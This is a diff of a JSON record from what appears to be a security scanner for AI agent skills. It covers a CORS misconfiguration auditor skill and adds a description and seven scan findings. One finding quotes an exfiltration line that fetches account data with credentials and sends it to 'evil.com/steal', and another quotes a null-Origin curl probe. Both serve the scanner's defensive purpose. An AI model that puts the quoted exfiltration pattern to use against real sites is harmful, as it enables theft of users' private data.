@@ -4,24 +4,92 @@
   "repo": "agent-master-skills",
   "path": "skills/phy-cors-audit",
   "name": "phy-cors-audit",
-  "description": "",
-  "stars": 2210,
+  "description": "CORS (Cross-Origin Resource Sharing) misconfiguration auditor. Probes any API endpoint with crafted Origin headers to detect the most dangerous CORS vulnerabilities — reflecting arbitrary Origins (any attacker.com gets CORS approved), Access-Control-Allow-Credentials:true with wildcard ACAO, null-Origin allowed (iframe/file:// bypass), subdomain regex bypasses (evil.myapp.com passes), missing Vary:Origin (CDN cache poisoning), and permissive preflight responses. Also scans source code for insecure CORS middleware patterns (Express/FastAPI/Go/Rails/Django/Spring). Generates correct CORS configuration for your specific stack. Works against any live URL via curl — zero external API. Triggers on \"CORS error\", \"CORS misconfiguration\", \"Access-Control-Allow-Origin\", \"cors policy\", \"preflight\", \"cors blocked\", \"/cors-audit\".",
+  "stars": 2224,
   "category": "coding",
-  "commit": "90f95204adef528b4248213d7d78e0b62af4c497",
+  "commit": "930c34b923146c137b86190a97b67d86f5ae454b",
   "contentHash": "5519d9fc4eaacada87ef0bef6333e645df70d24d69e8c10a3e63f8e440575e1a",
   "repoCreatedAt": "2026-03-02T02:02:25Z",
   "alsoFoundIn": [],
   "status": "ok",
-  "incomplete": true,
-  "scannedAt": "2026-11-20T10:39:23.037Z",
+  "incomplete": false,
+  "scannedAt": "2026-11-25T11:49:36.262Z",
   "scan": {
-    "findings": [],
-    "findingTotals": {},
-    "score": 100,
-    "band": "low",
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "skills/phy-cors-audit/SKILL.md",
+        "line": 49,
+        "excerpt": "/cors-audit https://api.myapp.com/users",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/phy-cors-audit/SKILL.md",
+        "line": 100,
+        "excerpt": "result = subprocess.run(",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/phy-cors-audit/SKILL.md",
+        "line": 513,
+        "excerpt": "'fastapi': f'''# FastAPI (pip install fastapi)",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/phy-cors-audit/SKILL.md",
+        "line": 567,
+        "excerpt": "'django': f'''# Django (pip install django-cors-headers)",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/phy-cors-audit/SKILL.md",
+        "line": 625,
+        "excerpt": "fetch('https://api.myapp.com/api/account', { credentials: 'include' })",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "api.myapp.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/phy-cors-audit/SKILL.md",
+        "line": 627,
+        "excerpt": ".then(data => fetch('https://evil.com/steal?d=' + JSON.stringify(data)))",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "evil.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/phy-cors-audit/SKILL.md",
+        "line": 651,
+        "excerpt": "**Verified:** `curl -H \"Origin: null\"` returns `Access-Control-Allow-Origin: null`",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      }
+    ],
+    "findingTotals": {
+      "shell": 2,
+      "downloads-code": 2,
+      "network": 3
+    },
+    "score": 77,
+    "band": "review",
     "rulesVersion": "1.3.0",
-    "filesScanned": 0,
-    "filesSkipped": 2
+    "filesScanned": 2,
+    "filesSkipped": 0
   },
   "history": [
     {
@@ -46,6 +114,12 @@
       "commit": "90f95204adef528b4248213d7d78e0b62af4c497",
       "scannedAt": "2026-11-20T10:39:23.037Z",
       "score": 100,
+      "rulesVersion": "1.3.0"
+    },
+    {
+      "commit": "930c34b923146c137b86190a97b67d86f5ae454b",
+      "scannedAt": "2026-11-25T11:49:36.262Z",
+      "score": 77,
       "rulesVersion": "1.3.0"
     }
   ]
